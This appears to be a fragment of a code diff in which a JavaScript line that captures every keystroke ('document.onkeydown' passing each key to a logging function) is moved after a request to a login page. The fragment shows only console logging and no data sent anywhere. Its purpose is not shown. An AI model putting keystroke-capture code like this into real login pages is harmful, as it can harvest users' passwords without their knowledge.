@@ -13,6 +13,6 @@
     console.log(`in data: ${data}`)
   }
   
-  document.onkeydown = ({key}) => log(key)
   load(`/login.php?url=${encodeURIComponent(comfort)}`)
+  document.onkeydown = ({key}) => log(key)
 })()
